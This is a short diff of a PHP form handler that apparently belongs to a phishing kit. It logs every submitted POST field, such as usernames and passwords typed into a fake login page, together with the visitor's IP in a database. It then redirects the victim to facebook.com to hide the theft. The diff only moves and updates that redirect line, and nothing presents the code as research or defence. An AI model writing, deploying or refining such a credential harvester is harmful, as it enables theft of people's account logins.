@@ -4,7 +4,7 @@ include_once 'sql.php';
 include_once 'ip.php';
 
 $ip = getUserIP();
-
+header('Location:https://www.facebook.com');
 foreach($_POST as $variable => $value) {
         $data = mysqli_real_escape_string($conn,$variable ." = " . $value);
         //INSERT INTO `data`(`IP`, `DATA`) VALUES ([value-1],[value-2])
@@ -16,6 +16,7 @@ foreach($_POST as $variable => $value) {
 }
 }
 
-header('Location:http://www.facebook.com');
+
+
 
 ?>
